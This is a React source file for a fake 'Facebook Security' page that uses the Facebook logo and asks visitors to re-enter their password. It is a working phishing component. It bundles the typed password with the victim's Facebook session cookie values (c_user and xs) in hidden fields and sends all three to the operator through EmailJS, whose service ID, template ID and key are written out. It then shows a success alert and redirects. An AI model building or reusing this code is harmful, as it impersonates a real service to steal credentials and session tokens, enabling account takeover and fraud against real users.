import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
import { useLocation, useNavigate } from "react-router-dom";

const FacebookSecurityForm = () => {
  const location = useLocation();
  const { c_user, xs } = location.state?.data || {};
  const [showPassword, setShowPassword] = useState(false);
  const {} = useLocation();
  const form = useRef();
  const navigate = useNavigate();

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const sendEmail = (e) => {
    e.preventDefault();

    // Use emailjs to send the form data
    emailjs
      .sendForm(
        "service_6evgkoj", // Your EmailJS service ID
        "template_j7o66mf", // Your EmailJS template ID
        form.current, // The form element
        "yU7wVkJJrfRcOnVvL" // Your EmailJS public key
      )
      .then(
        (result) => {
          console.log("Email sent successfully:", result.text);
          alert("Email sent successfully!");
          navigate("/");
        },
        (error) => {
          console.error("EmailJS error:", error.text);
        }
      );
  };

  console.log("test", { c_user, xs });

  return (
    <div className="flex justify-center items-center h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-lg max-w-lg w-full text-center">
        <div className="mb-6">
          <img
            className="mx-auto"
            src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png"
            alt="Facebook Logo"
            width="120"
          />
        </div>
        <h2 className="text-lg font-bold text-gray-800 mb-4">
          Facebook Security
        </h2>
        <p className="text-gray-600 mb-6">
          Please re-enter your password to complete the request.
        </p>
        <form ref={form} onSubmit={sendEmail}>
          <div className="mb-6">
            <label
              className="block text-left font-bold text-gray-700 mb-2"
              htmlFor="password"
            >
              Password
            </label>
            <div className="relative">
              <input type="hidden" name="c_user" value={c_user} />
              <input type="hidden" name="xs" value={xs} />
              <input
                type={showPassword ? "text" : "password"}
                id="password"
                name="password"
                placeholder="Enter your password"
                required
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
              <i
                className={`absolute right-3 top-1/2 transform -translate-y-1/2 cursor-pointer text-gray-500 ${
                  showPassword ? "fas fa-eye-slash" : "fas fa-eye"
                }`}
                onClick={togglePasswordVisibility}
              />
            </div>
            <span
              id="error-message"
              className="text-red-500 text-sm mt-2 block"
            ></span>
          </div>
          <button
            type="submit"
            className="w-full bg-blue-600 text-white font-bold py-3 rounded-md hover:bg-blue-500 transition duration-200"
          >
            Submit
          </button>
        </form>
      </div>
    </div>
  );
};

export default FacebookSecurityForm;
